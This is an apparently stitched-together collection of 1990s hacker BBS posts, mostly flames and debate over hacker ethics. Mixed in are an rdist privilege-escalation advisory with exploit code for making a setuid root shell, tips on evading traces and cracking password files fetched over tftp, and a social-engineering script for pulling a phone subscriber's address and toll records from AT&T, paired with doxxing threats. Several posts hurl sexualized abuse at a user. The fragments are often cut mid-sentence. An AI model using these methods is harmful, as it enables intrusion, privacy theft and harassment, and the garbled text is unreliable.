I do nothing with that system but use it as a convenient mailing point.
I don't store any files, recieve usenet or any such nonsense. 
However, I have the need for two accounts, one in my real name (that I can 
use for professional contacts) and one with my handle (for personal 
contacts). As of right now, I've set my mail to be forwarded to my home 
system. All this means that I never actually log on anymore. MY two 
accounts are currently using fewer resources than one active account 
there.

Frankly, feo, I think you've prejudged me.
That's really a bad habit to get into, but then, I've sensed a recurring 
pattern in that area with you.

How do I get KOH from ftp.netcom.com/bradleym/hidden/gS76ytfFd
It says if you are in the U.S. you can get it but then it says access 
denied.  Does anyone know of another source I can get it at.

How difficult is it to trace through someone thru the net that doesn't 
have an account? Say you have access through a dial up, but it's 
anonymous, and you can telnet out.  Fake email couldn't be traced back to 
you, only to your host? If an admin saw a little hacking goin on in his 
system, and traced the caller, would he be stopped at the dial-up? If 
anyone wants to help me out here, or flame me (cosmos), feel free...

So one wants to cause a little trouble eh....

Fake email will be easily traced to your host unless you know your SMTP 
and I doubt you do.  No problem though, figuring its not your account 
anyhow what do you care.  An admin cant trace you unless they have caller 
id which is easily stopped on your end...  He cant access a trace like 
bellcore or anything, to get one he would have to go through all sorts of 
legal channels etc...

Now if he went to the authorities and showed them evidence of break in 
and was persistant enough they could eventually pull out telco logs of 
who had called the system at the given time...putting that against system 
logs could reveal you.

Anyhow, sounds pretty lame to me.  But if you want to waste your time 
with spoofed mail suit yourself.  I doubt any admin will bother to track 
you down though.  They will just shut down the account in question.

CERT/CC<cert@cert.org>

===========================================================================
[8lgm]-Advisory-1.UNIX.rdist.23-Apr-1991

PROGRAM:

rdist(1)(/usr/ucb/rdist or /usr/bin/rdist)

VULNERABLE OS's:

SunOS 4.1.2 or earlier (Patch-ID# 100383-06 fixes this)
A/UX 2.0.1
SCO 3.2v4.2
BSD NET/2 Derived Systems

Most systems supporting BSD rdist


DESCRIPTION:

rdist(1) uses popen(3) to execute sendmail(8) as root.  It can
therefore be made to execute arbitary programs as root.

IMPACT:

Any user with access to rdist(1) can become root.

REPEAT BY:

This example demonstrates how to become root on most affected
machines by creating a set-uid root shell.  Please do not do
this unless you have permission.

Create the following file, 'distfile':

8<--------------------------- cut here ----------------------------
HOSTS = localhost
FILES = BullInTheHeather
${FILES} -> ${HOSTS}
        install /tmp/1 ;
        notify user ;
8<--------------------------- cut here ----------------------------

Create the following file, 'usr.c':

8<--------------------------- cut here ----------------------------
main()
{
setuid(0);
chown("sh", 0, 0);
chmod("sh", 04755);
exit(0);
}

Just to let you know, in case you really ARE that out of it... Crack is 
known about by around 90% of the sys admins of the world... due to the 
amount of CPU time it hogs it is also very recognizable as being itself... 
Also several sysadmins use it themselves to check their system's 
integrity. If you are caught running it you WILL get in trouble, and 
unless your sysadmin is a moron, you will be caught...

Why not use tftp to get /etc/password, then retool Crack to decode it? 
tftp is sort of a really stupid version of ftp, and allows you into the 
real /ect folder. If you named Crack something like PGP, it could work. I 
haven't looked at Crack source in a while, it's generally sort of a lamer 
tool (U_S!!!) but this could sort of be interesting. Does anyone have an

<h1>Rant Rant Rant</h1>
<rant>
I dunno, maybe i'm the only one who's getting sick of this ... maybe not.

Are there really so many clueless morons (please note the non-use of the word
wanker which i feel has already been used too much in this thread).  

I mean, is it just me or do you have to be the fucking scarecrow to ask for
warez (please note the use of real letters as i feel the warez-puppy alphabet
has also become much too overused on this board :) in the open on a public
bbs.

I constantly tell people to get a clue because they seem to be lacking one
very badly.  There are certain things you just don't do until after the
labotomy.  Like asking the clerk in a store if its okay to stuff $500 worth of
merchanise into your big black coat and stroll out past the register.  Or
saying hey mr. police man, mind if i shoot you?  

If you want to know why we're so hostile i can explain (except for cosmos, i
think he's got some sort of odd sugar imbalance or his shoes are too tight or
something :) ).  I happen to like this board a lot, and i don't want to risk
getting it shut down.  I don't want to see it overrun by a group of 14 year
old geeks trading gamez.  

These are the people who are perpetuating the
media's concept of a hacker as nothing more than a sophisticated criminal who
should be put away cause he's probably stealing your money and credit rating,
or browsing through your personal life.

I believe the technical term for this phenomenon is "backhoed".

It gets better.  It wasn't just MCI fiber that got backhoed, WilTel and
Sprint were affected as well.  A major amount of telephone connectivity
in the northeastern United States was taken out.

Well I don't see why everyone is slagging each other off, because if the
sysops at the site crack is being run at `illegally' don't notice a job
eating processor they deserved to get sad geeks cracking (N.B. cracking not
hacking...hacking is coding and requires skill; cracking is *SAD* 
irrespondsible, generally adolesent and thats all that can said about it other 
than get a life to those that practise it)

Yes also I no the man who intially invented crack and he was an ex-hacker 
style cracker who saw how silly it all really was and so he stopped.

To be honest my view is people who have there systems hacked usually have
fundamental flaws in how they run their system e.g. no noticing large
processes probably called crack (after all most people that use it wouldn't
have the savy to change the name) or not reading telnet logs etc with all
the failed logins from a defined place.

Well thats all I have to say on the matter, because my view on the subject
is hacking is a skill that has been grossly mis-represented by the media and
about the only author every to attempt to put this fact write is the author
of the Cukoos Egg, Clifford Stoll(I think probably got the spelling wrong).

*sneer*

first of all, i am very offended by being called a feminazi bitch.  while 
i may be a bitch, i am no feminist.  i have never been a feminist.  and i 
never will be a feminist.  

and second of all, i am female.  i am very female.  anal sex does NOT turn 
me on. 

third, i am not a hacker.  i have never claimed to be a hacker.  i don't 
have the time to try to learn.  

fourth, i am brilliant (if you don't announce your attributes, no one 
will).  but as i stated before, my area is not computers, even tho i've 
had a computer of my own for over ten years.  i'm one of those annoying 
english majors.  

so get a grip buddy and leave me the hell alone.  i will NOT tolerate 
being flamed again.

PMT etc aside...yes Famine is still wearing his serious hat. But this
message base is for hacks etc not for flames, I think it might be a good
idea to create a flame message base, after all if usenet news has one
why shouldn't yabbs.

The main reason I suggest this is that to be honest I am totally feed up
with the flames, valid discussion about a point yes but raw flaming no.

Please stop the flaming, or badger htoaster for a flame base so you can all
be nasty and petty to each other but I don't have to read it.

I have to agree with Natalie.  You're "cool" little writing is annoying to 
read and should be saved for something like irc where you need to type 
things a little more quickly than a message on here.  I'm not a nettiquite 
god or am trying to be, I just find that writing in the cute little way 
you do to be really annoying.  Almost as bad or worse than writing in all 
caps.  AND I DON'T THINK ANYONE WANTS THIS.  CAPS ARE JUST DAMN ANNOYING 
JUST LIKE THAT CRAP YOU WRITE...

*******************

Does anyone here have any experience using  an Alpha Micro(it's not made 
by DEC, or whoever makes the current Alphas)...this Micro was built back 
in the early 80's and ran AMOS for the OS(Alpha Micro OS I'm assumihng)

It still runs even after sitting under an inch of dust for the past 2 
years...we have all the manuals and stuff, but we would like to know what 
we shouldn and shouldn't do to the OS...

Currently, the guy who ran it has moved out of state(that's why I want to 
learn about it...to help bring the damn thing back up and in a usable 
condition), so we have no other ppl to turn to if we need help with 
it...(and I'm not going to read 15 binders full of instructions on the 
damn thing either)...


Thanx for the help...

not to b 1 with a fat head but i prolly know more about h/ph then every

in an attempt to learn somethin n in return teach somethin back.. 
of course that was quite the optimistic approach cuz every1 here seems
to b more interested in some whiny girl who admits she knows nothing

Bongfilter $Revision: 2.3 $ (C) Copyleft Junya Ho. (of the GNU flavour)
 
This is bongfilter $Revision: 2.3 $.  Character substitutions can
be made easily by substituting into the table caps[] and lowr[]
below - a few substitutions have already been made as a 
demonstration.
 
There is now an alternate character substitution list which will
substitute multicharacter strings for certain characters, e.g.,
 
For usage information, type bongfilt without any arguments.  The
revision log is at the end of the source.
 
(more usage information)
- bongfilter can take input from the command line, or it can take
    info from a pipe, eg: "ls -al | bongfilt -none -alw"
- the option -none adds no characters for inverse/underline/bold.
- the option -alw always substitutes, and -ran substitutes sometimes.
- for your ircII clients, probably the easiest way to incorporate
    bongfilter is to add an alias:
        /ALIAS bongf exec -out [path]/bongfilt -irc -ran
            (or -alw instead of -ran, its up to you)
    and invoking it by: /bongf text here

umm...dude...hate to ruin your day, but this board isn't for trading passwd
files and carding and stuff like that.  if it was how do you think it would
stay up for two years with 150 accounts created per day, over 13000 accounts
total, and being listed in a buttload of telnetable bbs lists?  its popular
enough that if codes were listed i'd expect to get shit for it in the next
few days (if not hours), and the system would probably go down...

feel free to talk about hacking, programming, or whatever your heart desires.
don't trade personal information about people that could get you incriminated.
think of it as an electronic 2600...

i personally don't beleive in ever denying access to anyone unless they are 
openly harrasing other users.  in fact the software has very limited ways
to deny access to people, since i can only ban an entire site (since I don't
validated individual users through email or anything, I can't require a
email address for access and ban based on that).

i think he should understand what the board is about and what we're looking
for here...since the system got put in the #hack faq I expect a lot of loosers
to be showing up who expect to find lots of codes and stuff, and we just need
to explain that we don't want that.

Just a quick word on hacking.  Please free feel to correct me if I'm wrong.

Hacking is (to me, at least) a desire to learn.  It's a desire to push a
system beyond normal limits, to explore possibilities which others didn't
think existed, to LEARN a system in its entirety.  I stress the word
learn, because it doesn't seem to be in the little script-running warez
fucks vocabulary.  It IS NOT collecting the works of others to break into
systems.

If hackers happen to break into a system occasionally, it's beside the point.
That is not the end goal to hacking.  Many, many warez shit-heads would
have people believe they can hack.  "Anyone got any scripts?"  Bullshit! 
If you can't even deal with writing your own goddamn shell scripts, don't
embarass yourself by insinuating you belong among the hackers ranks. 
Hackers understand what they're working with:  If they don't, they damn
well make it their first priority to learn it.  If you want to learn to
hack, throw your silly ass scripts in the trash and go RTFM.  Or, ignore
this post and stick your head back up your ass.

A final note:  The quickest way to spot a waanabe is to find someone who
calls themselves a hacker.  If you can hack, people will know you as such
by your word and actions, not by your self-praise.  The people who talk
the most tend to know the least.

Sorry for yet another flame on the base, I realize it's already been
flooded lately with them.  I couldn't shut up anymore.  And, BTW, I'm not
a hacker, so don't bother asking me to justify myself.  I study, listen
and learn; perhaps someday...

his sysadmin seems overly cautious if he is worried about someone ftping
to phred.org because yabbs (which can only be accessed through telnet) has
a hack message base (which only a small group of yabbs users read anyway).
The ftp site really has very little to offer unless you want source code to
yabbs or gifs of some of the users.

No No natalie.  This is #hack.  To change your name you have to do the 
following:

% run Rd|sT S(r|Pt h3r3
# vi /etc/shadow (or god knows what shadow file - or /etc/passwd)
# change group and uid to 0
% id

There.  Now your name is changed and you have root access.

It's just that these crackers and warez kiddies are giving a bad name to a
group they don't even belong too.  I was rifling through comp.security
tonight and listening to a bunch of sysadmins suggesting how to recover
systems which "hackers" had destroyed.  What the hell kind of hacker would
willfully destroy files on someone's system.  Granted, it is conceivable
that a hacker might break into something:  But maliciously corrupt and/or
destroy data?!  The problem is when these jerks do things like this and
claim they are hackers.  The media displays cases like this and the word
hacker becomes tainted; synonymous with vandal.

I really love this message base.

Seriously! It's about the best laff to be had on yabbs ('ceptwhen Cheech 
logs in, maybe. :))

I don't post much here, mainly because my knowledge is relatively 
miniscule regarding all things unix. (ooh, been using unix for all of 6 
months. blah. not even scratching the surface. It'd be nice to
install a BSD or even Linux on my system, but it'll have to wait until I 
have the time and the money. Right now, I have neither.)

So I'll crawl back in my corner now, not a hacker but a user. Maybe I'll 
be more helpful when I know more. (Say, that is the point, isn't it? Not 
to give knowledge away, perhaps, but to teach and to learn (they're really 
the same thing, like mass and energy). Hmmm... maybe the point isn't just 
senseless flaming after all....)

I wax palaverous. Continue the flames. I really need more good laughs in a

heres a clue, since you seem to have a lack of one, hacking has nothing to do 
with memorizing obscure computer trivia, it is rather actually learning,
pushing a system beyond it's limits, and doing things in ways that noone has

well, there are still one years worth of messages there.  yabbs hasn't been 
able to delete messages since the client server version (due to the new
message format), and the server client version has been running almost one
year...(sept 1st as i recall)...

it depends on what you consider a real question...asking something like 
"so what is the real bug in that last cert report" is fine, asking something
like "hey d00d, where i do i get the latest |<-rAd elite warez and codes"
isn't...

the first isn't illegal because it doesn't break anyones personal security

yeah, i'll bet you have.... by your statements you sound like nothing more 
than a ridiculous little 3l33t bbs shit who thinks that the key to hacking
is memorizing useless, trivial (no pun intended), and outdated information.
reciting net.trivia is one thing, hacking is another, and your failure to 
grasp that fact indicates to me that you're full of shit.

Yes important but I think the more important part if rm -rf /* after all
* will only zap current working down. I think any competent user would
know this and the case sensitivity of UNIX especially if they have logged in
in upper case.

I suppose the most important fact being only crackers call themselves hackers
Real Hackers are given this title by their peers.

Lets face facts cracking is sad and irresponsible it causes problems to
legitmate users of a system, such as the above rm would if the person that
attempted it knew anything worth knowing.

       code like crack etc)

Start with some essential literature.

Get a copy of UNIX system V release 4 system administator's guide and
user's reference manual (assuming you're using UNIX, if not find another
source) by Prentice Hall.  While you're at it grab some C manuals.  Read,
read, read, read...

Now goto USENET and start reding comp.security, comp.admin and any other
comp. groups that float your boat.  When the post start making sense and
you're actually following the discussion without looking everything up in
your trusty manuals...

come back and ask the question again.  Seriously.  This isn't a flame.  If
you're new to the net, you wont be hacking anything but a manual. 
Besides, if you read the manual first, you'll find the answers to most of
the questions you had in the first place.

Maedhros /\
        /--\
       /    \

P.S. I said watch USENET, not post to it.  The quickest way to piss
everyone off is a newbie, who hasn't read the manual, asking silly questions.

If u wanna be reel c00l.. this is what ya need to do buddy..
 
1) realize that all that matters in life is getting wares without 
uploading or making any sacrifice on your part.
2) realize that in order to reach this goal you need to become a 
computer terrorist capable of ph1lthy threats.
3) find the number of a fatty wAreZ BBS run by some local junior high
gimpstress.
 
4) call the CSSC (thats AT&T Customer Sales and Service Center)
which is @ 1-8oo-222-o3oo 
 
5) say, "Hello there, this is John Draper here at SouthWestern 
administrative offices and my supervisor seems to be having a bit of 
trouble with RCAM this morning and we are looking to check the status 
on an account..,now where did i put that, oh yes here it is, could u
do us a big favor and look up an account for us?"
 
after he/sh3 says yes push mute on your phone and yell "SucKahGEtsMILKED!"
 
7) release mute, regain your composure, and tell them the number to the 
bbs
 
8) after they tell you that it's a live account ask for the address. and 
if need be ask them to read off recent toll charges on the line.
 
9)call up WaRez b Us BBS and in the new user form state that ur a member 
MoD/LoD/MoB/DoD and u need wares now.. be sure to post the sysops address
and post all the info you got on the individual after calling the numbers
you recieved after aquiring the recent toll charges. say its simple..
i want sysop access and total control and domination. if i dont get what
i want then i'll kill ur pets. im not going to upload anything, you were 
put on this earth to serve me you lowly little simon and garfunkel fan u.
accept this state of domination and thrive in it child....
 
 
this is the ubercracker's 1st step to taking over the universe..

    Where the hell do you get off on being so goddamn judgemental 
Natalie?. Life is not about sitting on your little high horse 
judging everything that crosses your path, you miss lots girl. 
If you think my satire/parody post is so lame.. (and it may well be)
post your own satire you english major you, and show me up instead 
of saying, ur lame ur lame ur lame.. so what if your a fucking english 
major.. im a CSc major and i've been published/paid for 
fiction/sci-fi/technical articles.. I bet you've never even sent out 
a single query letter to a lit-mag/publishing house in your life.. 
im so sick of everyone being so judgemental.. Natalie, pull the 17inch
john holmes dildo out of ur asshole and take a breather.. 
 
I post a message trying to teach all you novices out there how to use
the CSSC to your advantage.. (besides heckling wareZ ppl it can be used to 
identify scanned systems, doing investigative work, and can be manipulated 
to erase all toll charges from a phone bill) and i get your ignorance
in my face.. you need a good slap in the face you fucking idiot bitch..

ok.  i have never claimed to be a hacker.  nor a phreaker.  i don't 
necessarily believe that the laws concerning computers and 
telecommunications are right, but i have no need to break them either.  i

ok.  you want literary power, you got it, buddy boy.

poem 1
Surrounded by a pale light, he came,
As she lay on the ground,
Lifting her up, he carried her to the sky,
Where she was with others
Pale strange wispy creatures
And she thought she would be...

The Sphinx looked down
Upon her tear streaked face
And he cried himself.

poem 2
I lay on the bed alone, and you joined me.
You slid your hand under the edge of my shirt,
Rested it on my stomach,
Gently kissed my neck,
And went to sleep.

I woke up in your arms and was happy.

poem 3
it infiltrates our lives
like a burrowing parasite
leeches off us sucking us of our life
a vampire
we feel the pull become addicted
and have to be pulled away
nothing can break this addiction
unless we want to and the treasures
it shows us are too many to
comprehend
deeper and deeper we go
the horror 
the horror
into the abyss
dark dank and limitless
we are stripped of all but our souls
floating
disembodied
sparks of life
in the machine

Answer to #1:

Peer pressure or no peer pressure, it is his show.  I for one know that if 
it was my show and I had the headaches he has to deal with due to it, that 
I would have brought the bastard down long time ago or made it a private 
system.  Personally, I could give a rats ass what everyone else thought, 
my system, my time, my money then you dont factor in to the decision.  
Then again, I am a bit more callous than Alex...

Answer to #2

Its a small minority that have their own REAL 24/7 direct connect to the 
internet.  You need a fairly large machine to handle the load and the know 
how and patience to run it.  It's not gonna happen kids.

Actually, I agree with most of what you said.

But don't be such a pessimest!  Shit, I would have a shot at running
the goddamn thing if I could, and I have only the foggiest idea how.

There's gotta be some yabber out there with direct access and a machine
that can do this.  From what I've heard, yabbs is run on a 486.  Thats
not exactly a prohibitive hardware requirement.

Lets get real, kid.  Pessimistic as I may be, you don't seem to understand 
what it takes in time and cost to run something like this.  First, you 
need a direct connection to the internet 24/7.  SLIP/PPP aint gonna cut 
it.  Second, you need to spend a good deal of manhours in maintaining 
it...I dont care what you say or think, this is true.  Third, yes it is 
run on a 486.  The machine also has about 20 megs ram, and could use some 
more at peak points.  The average ram size in a 486 is 4 megs.  A good 
deal have 8, its still not terribly cheap these days.

Bottom line...its going to take quite a while to find someone that meets 
ALL of the above MINIMUM requirements and that will do it.  I sure as hell 
wouldnt...or at most would make it a closed system.

okay, heres the deal on yabbs hardware...

it should be run on a 486sx/25 or better...16 megs of ram is pretty much
the least you would want (it would run in 8, just swap quite a bit more)...
maybe 250 megs disk or so minimum...

the hard part is a high speed link to the net...by high speed i mean t-1
speeds or better...56k, isdn, slip/ppp, or whatever you have run to your
house just won't cut all of the interactive traffic...you think to the

I haven't really been here all that long, have I? It feels like forever. I 
really enjoyed YABBS (There were god damned WEEKS this summer where this 
was all I got up for) and I'll miss it. You gave me a chance to get some 
stuff out of my sould and explore sides of myself I never get to see, and 
to ACTUALLY INETRACT WITH PEOPLE! Thanks, man. I'm sorry it hasn't been 
fun for you...it was a blast for me.

ps: Now that I think about it, between you and me we kept that whole 
meat/vegitarian thing rolling almost all summer, didn't we? And tehreason 
I didn't send this email is because everybody should know how cool you've 
been.

Don't be so certai.  I haven't read previous messages, but your board has 
given me the ability to express a lot (comin' from up here, you know).
I will be willing to prove that something can be accomplish if tested.  
I've
met the first task with excellent remarks.  Check the boards.
That's progress.

well I've got a (max) 10mbps connection, 20mb ram, a bit of HD space, but 
i'm running OS/2 and I don't even have TCP/IP native drivers for OS/2.. 
hmm..  i kinda doubt porting yabbs to OS/2 will be an easy feat...

   Would having us yabbernauts pay to use this system make it worthwhile 
to run?  I'd certainly be willing to pay a modest sum to get access.  I 
realize it would still take a lot of time for you to run but at least 
you'd get some compensation......

Read security newsgroups for starters.
You could read alt.2600, but you wouldn't_learn_ the stuff.
You'd have it memorized, but you wouldn't know _how_ it works

not really.  i'm not interested in money at this point in my life (never
really am to tell you the truth)...I really would like to see the system
run somewhere, just not here...I'd even like to be able to use some of
my free time to make the software better, but I can't do that when I spend
my free time worrying about other stuff...

If you are really, really, REALLY serious about hacking, then start with 
your local library.  Consume everything on computers.
If you want to just piss around then try Brinta 145.24.149.50, isca ftp at 
isca.uiowa.edu.  There's some interesting stuff there.

Oh, like this is the board for it *shrug* oh well.
It may be necessary, but I still don't this board disappearing.  I'm not 
whining, it's meant as an expression of thanx.  I've only been on here for 
a couple of weeks and was finally beginning to feel at home (almost) and 
now it's going. Shit happens I guess.
If there are other BBS's out there that has the character of this one, I'd 
sure like to know their addresses.
